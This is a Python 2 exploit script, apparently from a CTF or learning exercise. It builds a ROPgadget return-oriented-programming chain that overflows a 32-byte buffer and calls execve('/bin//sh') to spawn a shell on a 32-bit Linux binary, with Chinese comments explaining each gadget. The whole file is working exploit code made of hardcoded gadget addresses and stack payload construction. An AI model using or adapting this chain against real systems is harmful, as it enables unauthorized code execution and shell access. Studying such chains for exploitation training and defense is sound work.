#!/usr/bin/env python2
# execve generated by ROPgadget

# execve("/bin//sh", NULL, NULL)
# call int 0x80
# eax = 11, ebx = pointer to string "/bin/sh"
# ecx = 0x0, edx = 0x0

from struct import pack

# Padding goes here
p = 'a'*32

# return address此時塞入了 pop edx ; ret的位址
# 程式跳到該位址開始執行此段gadget
# pop會將目前stack最上方的值assign給edx
# 清除該位址資料後, $esp會向下移動
# 此時stack的頂端為我們塞入的值

# 如果只是塞數字好處理, 字串的話就必須找data段的區域
# 所以要塞'/bin'和'//sh'就要找到data_start的address 

# pop edx來存 data+0 的address 
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data

# pop eax來存 '/bin' , 大小剛好4bytes
p += pack('<I', 0x080bae06) # pop eax ; ret
p += '/bin'

# 把eax的值（'/bin')寫入到 edx指的位址 (data＋0）
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret

# pop edx來存 data+4 的address
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4

# pop eax來存 '//sh', 大小剛好4bytes
p += pack('<I', 0x080bae06) # pop eax ; ret
p += '//sh'

# 把eax的值（'//sh')寫入到 edx指的位址 (data+4）
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret

# pop edx來存 data+8 的address
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8

# xor eax, eax 等於 mov eax, 0 
p += pack('<I', 0x08054250) # xor eax, eax ; ret

# 把eax的值（0）寫入到 edx指的位址 (data+8)
p += pack('<I', 0x0809a15d) # mov dword ptr [edx], eax ; ret

# pop ebx來存 data+0 的address [data+0目前的值是'/bin'], ebx = &'/bin'
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data

# pop ecx ebx
# ecx存 data+8 的address [data+8目前的值是0], ecx = 0
# ebx存 data+0 的address, 這邊他說會padding, 不太懂
# 最後 ebx = &'/bin' + &'//sh' ?
p += pack('<I', 0x0806e851) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx

# pop edx來存 data+8 的 address [根據上面操作 data+8目前的值是0], edx = 0
p += pack('<I', 0x0806e82a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8

# xor eax, eax 等於 mov eax, 0 (eax=0)
p += pack('<I', 0x08054250) # xor eax, eax ; ret

# inc(increment), +1 
# 以下總共做了11次, eax的值從0變成11, eax = 11
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x0807b27f) # inc eax ; ret
p += pack('<I', 0x080493e1) # int 0x80

print p
